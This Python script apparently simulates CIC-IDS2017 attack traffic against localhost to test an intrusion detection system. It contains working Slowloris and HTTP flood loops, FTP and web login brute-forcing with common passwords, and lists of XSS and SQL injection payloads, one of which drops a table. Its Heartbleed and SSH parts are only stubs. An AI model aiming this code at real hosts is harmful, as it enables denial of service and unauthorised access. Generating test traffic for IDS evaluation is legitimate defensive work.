#!/usr/bin/env python3
"""
CIC-IDS2017 Compliant Attack Simulator
Targets: 192.168.10.50 (Ubuntu Web Server)
Attacker: 205.174.165.73 (Kali Linux - simulated via loopback)
Ports: 80 (HTTP), 443 (HTTPS), 21 (FTP), 22 (SSH), 444 (Heartbleed)
Protocols: TCP (mostly)
"""
import socket
import time
import threading
import random
import struct
from datetime import datetime
import sys

# ============================================================================
# CIC-IDS2017 NETWORK CONFIGURATION (From dataset documentation)
# ============================================================================
# Official IPs from CIC-IDS2017[citation:1]
ATTACKER_IP = "205.174.165.73"    # Kali Linux attacker
VICTIM_IP = "192.168.10.50"       # Ubuntu Web Server (Primary victim)
# We'll simulate these IPs using localhost with specific ports
LOCALHOST = "127.0.0.1"
MAPPED_VICTIM_PORT = 8888         # We'll map 192.168.10.50 to localhost:8888

# Attack-specific ports (from dataset)
PORT_HTTP = 80
PORT_HTTPS = 443
PORT_FTP = 21
PORT_SSH = 22
PORT_HEARTBLEED = 444

def log(msg):
    """Consistent logging format"""
    timestamp = datetime.now().strftime("%H:%M:%S")
    print(f"[{timestamp}] {msg}")

# ============================================================================
# TUESDAY: BRUTE FORCE ATTACKS (FTP & SSH Patator)
# ============================================================================
def ftp_patator(duration_minutes=5):
    """FTP-Patator brute force attack"""
    log("🔐 Starting FTP-Patator (Brute Force)")
    
    # Common FTP commands used in brute force
    ftp_commands = [
        "USER admin", "USER root", "USER test", "USER administrator",
        "PASS password123", "PASS admin", "PASS root", "PASS test",
        "QUIT"
    ]
    
    end_time = time.time() + (duration_minutes * 60)
    attempts = 0
    
    while time.time() < end_time:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            
            # Connect to FTP port
            sock.connect((LOCALHOST, PORT_FTP))
            
            # Read banner
            sock.recv(1024)
            
            # Send brute force attempts
            for cmd in ftp_commands:
                sock.send(f"{cmd}\r\n".encode())
                time.sleep(0.1)
                
            sock.close()
            attempts += 1
            
            # Random delay between connections
            time.sleep(random.uniform(0.5, 2.0))
            
        except Exception as e:
            pass  # Expected for closed ports
    
    log(f"✓ FTP-Patator complete ({attempts} brute force attempts)")

def ssh_patator(duration_minutes=5):
    """SSH-Patator brute force attack"""
    log("🔐 Starting SSH-Patator (Brute Force)")
    
    # SSH protocol simulation (simplified)
    ssh_init = b"SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.4"
    
    end_time = time.time() + (duration_minutes * 60)
    attempts = 0
    
    while time.time() < end_time:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            
            # Connect to SSH port
            sock.connect((LOCALHOST, PORT_SSH))
            
            # Send SSH version
            sock.send(ssh_init)
            time.sleep(0.1)
            
            # Try to read response (will fail for our simulation)
            try:
                sock.recv(1024)
            except:
                pass
                
            sock.close()
            attempts += 1
            
            # Random delay
            time.sleep(random.uniform(1.0, 3.0))
            
        except Exception as e:
            pass
    
    log(f"✓ SSH-Patator complete ({attempts} connection attempts)")

# ============================================================================
# WEDNESDAY: DoS ATTACKS (Slowloris, Slowhttptest, Hulk, GoldenEye)
# ============================================================================
def dos_slowloris(duration_minutes=3):
    """DoS slowloris - Slow HTTP headers"""
    log("🐌 Starting DoS Slowloris (Slow HTTP headers)")
    
    # Create multiple partial connections
    sockets = []
    connections_made = 0
    
    try:
        # Open many connections but never complete them
        for i in range(50):  # Try 50 connections
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(10)
                sock.connect((LOCALHOST, PORT_HTTP))
                
                # Send partial request
                sock.send(b"GET / HTTP/1.1\r\n")
                sock.send(f"Host: {LOCALHOST}\r\n".encode())
                sock.send(b"User-Agent: Mozilla/5.0\r\n")
                # DON'T send \r\n\r\n to complete headers
                
                sockets.append(sock)
                connections_made += 1
                
                time.sleep(0.1)  # Slow down connection establishment
                
            except Exception as e:
                pass
        
        # Keep connections alive by sending partial data
        log(f"  Established {connections_made} partial connections")
        time.sleep(duration_minutes * 60)  # Keep alive for specified duration
        
    finally:
        # Cleanup
        for sock in sockets:
            try:
                sock.close()
            except:
                pass
    
    log(f"✓ DoS Slowloris complete ({connections_made} slow connections)")

def dos_slowhttptest(duration_minutes=2):
    """DoS Slowhttptest - Very slow HTTP headers"""
    log("🐢 Starting DoS Slowhttptest (Very slow HTTP)")
    
    sockets = []
    connections_made = 0
    
    try:
        for i in range(30):  # Fewer connections but slower
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(30)
                sock.connect((LOCALHOST, PORT_HTTP))
                
                # Send headers byte by byte with long delays
                request = f"GET /test{i} HTTP/1.1\r\nHost: {LOCALHOST}\r\n"
                for char in request:
                    sock.send(char.encode())
                    time.sleep(1.0)  # 1 second between bytes
                
                sockets.append(sock)
                connections_made += 1
                
            except Exception as e:
                pass
        
        log(f"  Established {connections_made} very slow connections")
        time.sleep(duration_minutes * 60)
        
    finally:
        for sock in sockets:
            try:
                sock.close()
            except:
                pass
    
    log(f"✓ DoS Slowhttptest complete ({connections_made} very slow connections)")

def dos_hulk(duration_minutes=2):
    """DoS Hulk - HTTP GET flood with keep-alive"""
    log("💥 Starting DoS Hulk (HTTP GET flood)")
    
    # HULK signature: random URLs, keep-alive, cache bypass[citation:6]
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
        "python-requests/2.25.1"
    ]
    
    end_time = time.time() + (duration_minutes * 60)
    requests_sent = 0
    
    while time.time() < end_time and requests_sent < 1000:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            sock.connect((LOCALHOST, PORT_HTTP))
            
            # Send multiple requests per connection (keep-alive)
            for _ in range(random.randint(3, 10)):
                url = f"/{random.choice(['index', 'test', 'api', 'data'])}"
                url += f"?id={random.randint(1, 10000)}"
                url += f"&cache={random.randint(1000000, 9999999)}"
                
                ua = random.choice(user_agents)
                
                http_request = (
                    f"GET {url} HTTP/1.1\r\n"
                    f"Host: {LOCALHOST}\r\n"
                    f"User-Agent: {ua}\r\n"
                    f"Accept: */*\r\n"
                    f"Connection: Keep-Alive\r\n"  # Key for HULK[citation:5]
                    f"Cache-Control: no-cache\r\n"  # Cache bypass
                    f"\r\n"
                ).encode()
                
                sock.send(http_request)
                requests_sent += 1
                
                # Tiny delay between requests
                time.sleep(0.01)
            
            sock.close()
            
        except Exception as e:
            pass
    
    log(f"✓ DoS Hulk complete ({requests_sent} HTTP requests)")

def dos_goldeneye(duration_minutes=2):
    """DoS GoldenEye - HTTP POST flood"""
    log("🔥 Starting DoS GoldenEye (HTTP POST flood)")
    
    # GoldenEye: Multiple URLs, random user agents[citation:6]
    user_agents = [
        "GoldenEye/1.0",
        "Mozilla/5.0 (compatible; GoldenEye)",
        "python-requests/2.25.1"
    ]
    
    end_time = time.time() + (duration_minutes * 60)
    requests_sent = 0
    
    while time.time() < end_time and requests_sent < 500:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            sock.connect((LOCALHOST, PORT_HTTP))
            
            url = f"/{random.choice(['login', 'submit', 'api', 'post'])}"
            ua = random.choice(user_agents)
            payload_size = random.randint(100, 1000)
            payload = "x" * payload_size
            
            http_request = (
                f"POST {url} HTTP/1.1\r\n"
                f"Host: {LOCALHOST}\r\n"
                f"User-Agent: {ua}\r\n"
                f"Content-Type: application/x-www-form-urlencoded\r\n"
                f"Content-Length: {len(payload)}\r\n"
                f"Connection: keep-alive\r\n"
                f"\r\n{payload}"
            ).encode()
            
            sock.send(http_request)
            sock.close()
            requests_sent += 1
            
            # Fast rate
            time.sleep(0.05)
            
        except Exception as e:
            pass
    
    log(f"✓ DoS GoldenEye complete ({requests_sent} POST requests)")

def heartbleed_attack(duration_minutes=2):
    """Heartbleed attack on OpenSSL (simulated)"""
    log("🫀 Starting Heartbleed attack (OpenSSL exploit)")
    
    # Simulate Heartbleed by connecting to SSL port and sending malformed data
    end_time = time.time() + (duration_minutes * 60)
    attempts = 0
    
    while time.time() < end_time:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            
            # Connect to Heartbleed vulnerable port (444 in CIC-IDS2017)
            sock.connect((LOCALHOST, PORT_HEARTBLEED))
            
            # Send something (in real attack, would be malformed heartbeat)
            sock.send(b"TEST\r\n")
            
            try:
                response = sock.recv(1024)
                if response:
                    attempts += 1
            except:
                pass
                
            sock.close()
            time.sleep(0.5)
            
        except Exception as e:
            pass
    
    log(f"✓ Heartbleed attack simulated ({attempts} attempts)")

# ============================================================================
# THURSDAY: WEB ATTACKS (Brute Force, XSS, SQL Injection)
# ============================================================================
def web_attack_bruteforce(duration_minutes=2):
    """Web Attack - Brute Force login"""
    log("🌐 Starting Web Attack - Brute Force")
    
    common_logins = ["admin", "root", "user", "test", "administrator"]
    common_passwords = ["password", "123456", "admin", "test", "root"]
    
    end_time = time.time() + (duration_minutes * 60)
    attempts = 0
    
    while time.time() < end_time:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            sock.connect((LOCALHOST, PORT_HTTP))
            
            user = random.choice(common_logins)
            pwd = random.choice(common_passwords)
            
            # Simple POST login attempt
            payload = f"username={user}&password={pwd}&submit=Login"
            
            http_request = (
                f"POST /login.php HTTP/1.1\r\n"
                f"Host: {LOCALHOST}\r\n"
                f"Content-Type: application/x-www-form-urlencoded\r\n"
                f"Content-Length: {len(payload)}\r\n"
                f"\r\n{payload}"
            ).encode()
            
            sock.send(http_request)
            sock.close()
            attempts += 1
            
            time.sleep(random.uniform(0.5, 2.0))
            
        except Exception as e:
            pass
    
    log(f"✓ Web Brute Force complete ({attempts} login attempts)")

def web_attack_xss(duration_minutes=2):
    """Web Attack - Cross Site Scripting"""
    log("🌐 Starting Web Attack - XSS")
    
    xss_payloads = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert(1)>",
        "<body onload=alert('XSS')>",
        "<svg onload=alert(1)>",
        "javascript:alert('XSS')"
    ]
    
    end_time = time.time() + (duration_minutes * 60)
    attempts = 0
    
    while time.time() < end_time:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            sock.connect((LOCALHOST, PORT_HTTP))
            
            payload = random.choice(xss_payloads)
            url = f"/search?q={payload}"
            
            http_request = (
                f"GET {url} HTTP/1.1\r\n"
                f"Host: {LOCALHOST}\r\n"
                f"User-Agent: XSS-Test\r\n"
                f"\r\n"
            ).encode()
            
            sock.send(http_request)
            sock.close()
            attempts += 1
            
            time.sleep(random.uniform(0.5, 1.5))
            
        except Exception as e:
            pass
    
    log(f"✓ Web XSS complete ({attempts} XSS attempts)")

def web_attack_sqli(duration_minutes=2):
    """Web Attack - SQL Injection"""
    log("🌐 Starting Web Attack - SQL Injection")
    
    sql_payloads = [
        "' OR '1'='1",
        "admin'--",
        "1' UNION SELECT * FROM users--",
        "' OR 1=1--",
        "'; DROP TABLE users--"
    ]
    
    end_time = time.time() + (duration_minutes * 60)
    attempts = 0
    
    while time.time() < end_time:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            sock.connect((LOCALHOST, PORT_HTTP))
            
            payload = random.choice(sql_payloads)
            url = f"/product?id={payload}"
            
            http_request = (
                f"GET {url} HTTP/1.1\r\n"
                f"Host: {LOCALHOST}\r\n"
                f"User-Agent: sqlmap/1.0\r\n"
                f"\r\n"
            ).encode()
            
            sock.send(http_request)
            sock.close()
            attempts += 1
            
            time.sleep(random.uniform(0.5, 1.5))
            
        except Exception as e:
            pass
    
    log(f"✓ Web SQL Injection complete ({attempts} SQLi attempts)")

# ============================================================================
# FRIDAY: BOTNET & PORTSCAN
# ============================================================================
def botnet_ares(duration_minutes=3):
    """Botnet ARES traffic simulation"""
    log("🤖 Starting Botnet ARES simulation")
    
    # Botnet behavior: periodic beaconing to C&C[citation:1]
    end_time = time.time() + (duration_minutes * 60)
    beacons = 0
    
    while time.time() < end_time:
        try:
            # Simulate C&C communication
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            
            # Try various "C&C" ports
            cnc_port = random.choice([6666, 7777, 8888, 9999])
            sock.connect((LOCALHOST, cnc_port))
            
            # Send beacon
            beacon_data = f"BEACON|{int(time.time())}|ACTIVE"
            sock.send(beacon_data.encode())
            
            # Simulate command receiving
            try:
                sock.recv(1024)
            except:
                pass
                
            sock.close()
            beacons += 1
            
            # Regular interval (every 10-30 seconds)
            time.sleep(random.uniform(10, 30))
            
        except Exception as e:
            # Expected - no C&C server running
            time.sleep(5)
    
    log(f"✓ Botnet complete ({beacons} beacons sent)")

def portscan_attack():
    """Port scanning attack"""
    log("🔍 Starting PortScan (sequential)")
    
    # Scan common ports
    common_ports = [21, 22, 23, 25, 53, 80, 110, 139, 143, 443, 445, 
                   3306, 3389, 8080, 8443]
    
    scanned = 0
    for port in common_ports:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.5)
            result = sock.connect_ex((LOCALHOST, port))
            sock.close()
            scanned += 1
            
            # Small delay between scans
            time.sleep(0.1)
            
        except Exception as e:
            pass
    
    log(f"✓ PortScan complete ({scanned} ports scanned)")

# ============================================================================
# MAIN EXECUTION
# ============================================================================
def run_scenario(scenario):
    """Run specific attack scenario"""
    
    scenarios = {
        "tuesday": [ftp_patator, ssh_patator],
        "wednesday": [dos_slowloris, dos_slowhttptest, dos_hulk, dos_goldeneye, heartbleed_attack],
        "thursday": [web_attack_bruteforce, web_attack_xss, web_attack_sqli],
        "friday": [botnet_ares, portscan_attack],
        "all": [ftp_patator, ssh_patator, 
                dos_slowloris, dos_slowhttptest, dos_hulk, dos_goldeneye, heartbleed_attack,
                web_attack_bruteforce, web_attack_xss, web_attack_sqli,
                botnet_ares, portscan_attack]
    }
    
    if scenario not in scenarios:
        print(f"Unknown scenario. Available: {', '.join(scenarios.keys())}")
        return
    
    attacks = scenarios[scenario]
    
    log(f"🚀 Starting {scenario.upper()} attacks from CIC-IDS2017")
    print("=" * 60)
    
    threads = []
    for attack_func in attacks:
        thread = threading.Thread(target=attack_func)
        threads.append(thread)
        thread.start()
        time.sleep(5)  # Stagger attacks
    
    # Wait for completion
    for thread in threads:
        thread.join()
    
    print("=" * 60)
    log(f"✅ {scenario.upper()} complete!")
    log("📊 Check your IDS dashboard for attack detection")
    log("💡 Note: You may need to adjust your flow_extractor for these patterns")

if __name__ == "__main__":
    print("""
╔══════════════════════════════════════════════════════╗
║   CIC-IDS2017 ATTACK SIMULATOR v3.0                 ║
║   Matches original dataset attack patterns           ║
║   ⚠️  USE ONLY FOR IDS TESTING ON LOCALHOST         ║
╚══════════════════════════════════════════════════════╝
""")
    
    print("Available scenarios (matching CIC-IDS2017 days):")
    print("  1. tuesday    - Brute Force (FTP/SSH Patator)")
    print("  2. wednesday  - DoS & Heartbleed")
    print("  3. thursday   - Web Attacks (Brute, XSS, SQLi)")
    print("  4. friday     - Botnet & PortScan")
    print("  5. all        - All attacks (recommended)")
    print()
    
    scenario_map = {
        "1": "tuesday", "2": "wednesday", "3": "thursday",
        "4": "friday", "5": "all"
    }
    
    choice = input("Select scenario (1-5 or name): ").strip().lower()
    scenario = scenario_map.get(choice, choice)
    
    confirm = input(f"\nStart {scenario} simulation? (yes/no): ").lower()
    
    if confirm == "yes":
        print(f"\nStarting in 3 seconds...")
        time.sleep(3)
        run_scenario(scenario)
    else:
        print("Simulation cancelled.")